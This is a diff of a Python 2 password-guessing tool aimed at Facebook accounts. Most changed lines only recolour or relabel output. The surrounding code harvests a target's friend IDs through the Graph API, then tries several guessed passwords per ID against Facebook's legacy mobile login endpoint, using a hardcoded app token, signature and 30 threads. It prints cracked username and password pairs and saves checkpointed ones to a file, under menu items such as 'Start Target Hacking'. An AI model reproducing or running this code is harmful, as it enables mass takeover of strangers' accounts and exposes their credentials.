@@ -111,14 +111,14 @@ listgrup = []
 vulnot = '\x1b[21mNot Vuln'
 vuln = '\x1b[22mVuln'
 os.system('clear')
-print '\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x88\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x8c\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x90\xe2\x94\xbc\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x90\xe2\x94\xbc\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x90\xe2\x96\x84\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x80\xe2\x96\x90\xe2\x96\x90\xe2\x96\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x8c\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x8c\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x94\x80\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x94\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x90\xe2\x96\x8c\xe2\x96\x88\xe2\x96\x88\xe2\x96\x8c\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x90\xe2\x96\x80\xe2\x96\x90\xe2\x96\x92\xe2\x96\x8c\xe2\x96\x80\xe2\x96\x88\xe2\x96\x80\xe2\x96\x92\xe2\x96\x90\xe2\x96\x92\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x8c\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\n===============================\n\n'
+print 'This Tools By Rishu Khan\n===============================\n\n'
 CorrectUsername = 'Cutex'
 CorrectPassword = 'Rishu'
 loop = 'true'
 while loop == 'true':
-    username = raw_input('\x1b[1;92m\x1b[1;97mTool Username \x1b[1;97m------- \x1b[1;97m')
+    username = raw_input('\x1b[1;92m\x1b[1;93mTool Username \x1b[1;97m------- \x1b[1;97m')
     if username == CorrectUsername:
-        password = raw_input('\x1b[1;92m\x1b[1;97mTool Password  \x1b[1;97m------- \x1b[1;97m')
+        password = raw_input('\x1b[1;92m\x1b[1;93mTool Password  \x1b[1;97m------- \x1b[1;97m')
         if password == CorrectPassword:
             print 'Logged in successfully as ' + username
             time.sleep(2)
@@ -138,13 +138,13 @@ def lisensi():
 def login():
     os.system('clear')
     print logo11
-    print '1.\x1b[1;93mLogin  Facebook  '
+    print '(1).\x1b[1;93mLogin  Facebook  '
     time.sleep(0.05)
-    print '2.\x1b[1;93mFree Acces Tokens Are Here '
+    print '(2).\x1b[1;93mFree Acces Tokens Are Here '
     time.sleep(0.05)
-    print '3.\x1b[1;93mLogin Using Token'
+    print '(3).\x1b[1;93mLogin Using Token'
     time.sleep(0.05)
-    print '0.\x1b[1;91mExit           '
+    print '(0).\x1b[1;93mExit           '
     pilih_login()
 
 
@@ -218,7 +218,7 @@ def login1():
                 keluar()
 
         if 'checkpoint' in url:
-            print '\n\x1b[1;97mYour Account is on Checkpoint'
+            print '\n\x1b[1;91mYour Account is on Checkpoint'
             os.system('rm -rf login.txt')
             time.sleep(1)
             keluar()
@@ -263,22 +263,22 @@ def menu():
     print logo2
     print '\x1b[1;92mLogged in User Info'
     time.sleep(0.05)
-    print '\t  \x1b[1;92m Name\x1b[1;97m:\x1b[1;97m' + nama + '\x1b[1;97m               '
+    print '\t  \x1b[1;93m Name\x1b[1;97m:\x1b[1;97m' + nama + '\x1b[1;92m               '
     time.sleep(0.05)
-    print '\t   ID\x1b[1;97m:\x1b[1;97m' + id + '\x1b[1;97m              '
+    print '\t   ID\x1b[1;93m:\x1b[1;97m' + id + '\x1b[1;92m              '
     time.sleep(0.05)
-    print '033[1;91m==========================\x1b[1;91m'
+    print '===================================\x1b[1;91m'
     time.sleep(0.05)
-    print '1 .\x1b[1;97m\x1b[1;92mStart Cloning   '
+    print '(1) .\x1b[1;97m\x1b[1;93mStart Cloning   '
     time.sleep(0.05)
-    print '2 .\x1b[1;97m\x1b[1;92mStart Target Hacking        '
+    print '(2) .\x1b[1;97m\x1b[1;93mStart Target Hacking        '
     time.sleep(0.05)
-    print '0 .\x1b[1;97m\x1b[1;91mLogout                         '
+    print '(0) .\x1b[1;97m\x1b[1;93mLogout                         '
     pilih()
 
 
 def pilih():
-    unikers = raw_input('\n\x1b[1;93mChoose Option --- \x1b[1;97m')
+    unikers = raw_input('\n\x1b[1;92mChoose Option --- \x1b[1;97m')
     if unikers == '':
         print '\x1b[1;91mFill in correctly'
         pilih()
@@ -311,16 +311,16 @@ def crack():
 
     os.system('clear')
     print logo19
-    print '1 .\x1b[1;92mStart Cloning  Public id  '
+    print '(1) .\x1b[1;93mStart Cloning  Public id  '
     time.sleep(0.05)
-    print '0. \x1b[1;91mBack'
+    print '(0) .\x1b[1;93mBack'
     pilih_crack()
 
 
 def pilih_crack():
     global cekpoint
     global oks
-    peak = raw_input('\n\x1b[1;93mChoose an Option>>> \x1b[1;95m')
+    peak = raw_input('\n\x1b[1;92mChoose an Option>>> \x1b[1;95m')
     if peak == '':
         print '\x1b[1;91mFill in correctly'
         pilih_crack()
@@ -328,18 +328,18 @@ def pilih_crack():
         if peak == '1':
             os.system('clear')
             print logo
-            jjt = raw_input('\x1b[1;92mEnter ID : \x1b[1;97m')
+            jjt = raw_input('\x1b[1;93mEnter ID : \x1b[1;92m')
             print '\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x96\xba\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x97\x83\xe2\x97\x84\xe2\x97\x85\xe2\x97\x83\xe2\x97\x84\xe2\x97\x85\xe2\x97\x83\xe2\x97\x84\xe2\x97\x85\xe2\x96\xb8\xe2\x96\xb9\xe2\x97\x83\xe2\x97\x84\xe2\x97\x85\xe2\x97\x83\xe2\x97\x84\xe2\x97\x85\xe2\x97\x83\xe2\x97\x84\xe2\x97\x85'
             try:
                 m = requests.get('https://graph.facebook.com/' + jjt + '?access_token=' + toket)
                 td = json.loads(m.text)
-                print '\x1b[1;92mName\x1b[1;97m:\x1b[1;97m ' + td['name']
+                print '\x1b[1;93mName\x1b[1;97m:\x1b[1;92m ' + td['name']
             except KeyError:
                 print '\x1b[1;91mID Not Found!'
                 raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;97m]')
                 crack()
 
-            print '\x1b[1;91mGetting IDs\x1b[1;97m...'
+            print '\x1b[1;93mGetting IDs\x1b[1;97m...'
             n = requests.get('https://graph.facebook.com/' + jjt + '/friends?access_token=' + toket)
             d = json.loads(n.text)
             for c in d['data']:
@@ -351,7 +351,7 @@ def pilih_crack():
             print '\x1b[1;91mFill in correctly'
             pilih_crack()
         print '\x1b[1;92mTotal IDs\x1b[1;97m: \x1b[1;97m' + str(len(id))
-        jalan('\x1b[1;91mPlease Wait\x1b[1;97m...')
+        jalan('\x1b[1;93mPlease Wait\x1b[1;97m...')
         titik = ['.   ', '..  ', '... ']
         for o in titik:
             print '\r\x1b[1;93mCloning\x1b[1;97m' + o,
@@ -359,8 +359,8 @@ def pilih_crack():
             time.sleep(1)
 
     print 'To Stop Process Press CTRL then Z'
-    print '-------------------------------------------------------------------'
-    jalan(' \x1b[1;91mPlz Wait Cloned Accounts Will Appear Here')
+    print '\x1b[1;93m----------------------------------------'
+    jalan(' \x1b[1;93mPlz Wait Cloned Accounts Will Appear Here')
     jalan(' \x1b[1;92m      Started Cloning Wait A while \xe2\x98\x95 ')
     print '\x1b[1;93m----------------------------------------'
 
@@ -378,10 +378,10 @@ def pilih_crack():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             s = json.load(data)
             if 'access_token' in s:
-                print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1
+                print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1
                 oks.append(user + pass1)
             elif 'www.facebook.com' in s['error_msg']:
-                print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1
+                print '\x1b[1;91mRISHU-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1
                 cek = open('out/checkpoint.txt', 'k')
                 cek.write(user + '|' + pass1 + '\n')
                 cek.close()
@@ -391,10 +391,10 @@ def pilih_crack():
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 s = json.load(data)
                 if 'access_token' in s:
-                    print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass2
+                    print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass2
                     oks.append(user + pass2)
                 elif 'www.facebook.com' in s['error_msg']:
-                    print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass2
+                    print '\x1b[1;91mRISHU-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass2
                     cek = open('out/checkpoint.txt', 'k')
                     cek.write(user + '|' + pass2 + '\n')
                     cek.close()
@@ -404,10 +404,10 @@ def pilih_crack():
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     s = json.load(data)
                     if 'access_token' in s:
-                        print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass3
+                        print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass3
                         oks.append(user + pass3)
                     elif 'www.facebook.com' in s['error_msg']:
-                        print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass3
+                        print '\x1b[1;91mRISHU-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass3
                         cek = open('out/checkpoint.txt', 'k')
                         cek.write(user + '|' + pass3 + '\n')
                         cek.close()
@@ -417,10 +417,10 @@ def pilih_crack():
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         s = json.load(data)
                         if 'access_token' in s:
-                            print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m' + pass4
+                            print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m' + pass4
                             oks.append(user + pass4)
                         elif 'www.facebook.com' in s['error_msg']:
-                            print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass4
+                            print '\x1b[1;91mRISHU-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass4
                             cek = open('out/checkpoint.txt', 'k')
                             cek.write(user + '|' + pass4 + '\n')
                             cek.close()
@@ -430,10 +430,10 @@ def pilih_crack():
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             s = json.load(data)
                             if 'access_token' in s:
-                                print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass5
+                                print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass5
                                 oks.append(user + pass5)
                             elif 'www.facebook.com' in s['error_msg']:
-                                print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass5
+                                print '\x1b[1;91mRISHU-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass5
                                 cek = open('out/checkpoint.txt', 'k')
                                 cek.write(user + '|' + pass5 + '\n')
                                 cek.close()
@@ -443,10 +443,10 @@ def pilih_crack():
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 s = json.load(data)
                                 if 'access_token' in s:
-                                    print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass6
+                                    print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass6
                                     oks.append(user + pass6)
                                 elif 'www.facebook.com' in s['error_msg']:
-                                    print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass6
+                                    print '\x1b[1;91mRISHU-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass6
                                     cek = open('out/checkpoint.txt', 'k')
                                     cek.write(user + '|' + pass6 + '\n')
                                     cek.close()
@@ -456,10 +456,10 @@ def pilih_crack():
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     s = json.load(data)
                                     if 'access_token' in s:
-                                        print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+                                        print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
                                         oks.append(user + pass7)
                                     elif 'www.facebook.com' in s['error_msg']:
-                                        print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
+                                        print '\x1b[1;91mRISHU-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
                                         cek = open('out/checkpoint.txt', 'k')
                                         cek.write(user + '|' + pass7 + '\n')
                                         cek.close()
@@ -469,12 +469,8 @@ def pilih_crack():
 
     p = ThreadPool(30)
     p.map(main, id)
-    print '\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4'
-    print '  Rishu On Fire '
     print '\x1b[1;91mProcess Has Been Completed \x1b[1;97m....'
-    print '\x1b[1;92mType (python2 rishu.py) New Fb Start Cloning\x1b[1;97m....'
-    print '\x1b[1;91mTotal Live/\x1b[1;91mCheckpoint \x1b[1;97m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;97m' + str(len(cekpoint))
-    print '\n\n\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x88\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x88\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x88@\xe2\x96\x88@\xe2\x96\x88@\xe2\x96\x88@\xe2\x96\x88\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x84\xe2\x96\x88\xe2\x96\x91\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x91\xe2\x96\x88\xe2\x96\x84\xe2\x96\x91\n\n\nLOGIN ERROR ID AFTER 2 WEEKS (14DAYS)\n\n'
+    print '\x1b[1;91mTotal OK/\x1b[1;91mCP \x1b[1;97m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;97m' + str(len(cekpoint))
     raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;97m]')
     crack()
 
@@ -526,7 +522,7 @@ def brute():
                         ceks.close()
                         print '\x1b[1;92mFounded.'
                         print '--------------------------------------------------'
-                        print '\x1b[1;91m[!] \x1b[1;97mAccount Maybe Checkpoint'
+                        print '\x1b[1;91m[!] \x1b[1;91mAccount Maybe Checkpoint'
                         time.sleep(0.05)
                         print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mUsername \x1b[1;97m:\x1b[1;97m ' + email
                         time.sleep(0.05)
